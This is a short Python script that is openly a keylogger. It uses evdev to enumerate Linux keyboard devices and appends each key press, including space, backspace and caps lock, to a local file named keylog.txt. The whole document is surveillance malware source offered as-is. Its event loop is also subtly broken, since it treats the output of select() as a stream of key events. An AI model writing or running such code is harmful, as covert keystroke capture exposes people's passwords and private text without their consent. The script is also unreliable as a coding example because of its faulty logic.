import evdev

from evdev import InputDevice, ecodes
from select import select

devices=evdev.list_devices()


keyboards = []
for path in devices:
    device = InputDevice(path) 
    if ecodes.EV_KEY in device.capabilities() and ecodes.KEY_A in device.capabilities().get(ecodes.EV_KEY, []): 
            keyboards.append(device)

print(keyboards)

log_file = open('keylog.txt','a',buffering=1)
try:
    for event in select(keyboards, timeout=1):

        if event.type == 1 and event.value == 1:

            key = evdev.ecodes.KEY[event.code]
            new_key = key.replace('KEY_',"")

            if new_key == "SPACE":
                log_file.write(" \n") 
            elif new_key == "BACKSPACE":
                log_file.write("[BACKSPACE]\n")
            elif new_key == "CAPSLOCK":
                log_file.write("[CAPS]\n")
            else:log_file.write(new_key + "\n")

except KeyboardInterrupt:
    pass
finally: log_file.close()


print('job_complete')